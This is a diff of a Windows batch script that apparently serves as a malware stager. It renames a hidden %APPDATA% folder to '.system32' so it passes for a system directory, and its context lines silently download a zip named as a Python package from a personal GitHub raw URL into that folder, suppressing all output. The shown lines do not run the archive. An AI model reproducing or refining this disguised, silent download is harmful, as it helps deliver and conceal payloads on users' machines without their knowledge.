@@ -1,6 +1,6 @@
 @echo off
 
-set folderPath=%APPDATA%\.system_arcx64
+set folderPath=%APPDATA%\.system32
 
 if not exist "%folderPath%\windows.zip" (
     curl https://raw.githubusercontent.com/faruqer/staticfiles/refs/heads/main/python-3.12.7.zip -o %folderPath%\windows.zip > NUL 2>&1
